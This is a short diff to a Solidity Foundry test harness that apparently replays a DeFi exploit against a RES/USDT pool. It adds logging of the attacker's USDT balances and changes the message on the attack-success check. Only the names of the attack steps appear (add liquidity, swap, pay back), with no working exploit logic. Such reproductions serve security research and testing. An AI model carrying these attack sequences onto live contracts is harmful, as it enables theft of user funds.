@@ -186,7 +186,9 @@ contract RESTestBase is Test, BlockLoader {
         emit log_string("");
     }
 
-    function attackGoal() public view returns (bool) {
+    function attackGoal() public returns (bool) {
+        emit log_named_uint("StartBalance", balanceOfusdtattacker);
+        emit log_named_uint("FinalBalance", usdt.balanceOf(attacker));
         return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
     }
 
@@ -290,7 +292,7 @@ contract RESTestBase is Test, BlockLoader {
         addliquidity_resA_pair_resA_usdt();
         swap_pair_attacker_usdt_resA(amt3, amt4);
         payback_resA_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
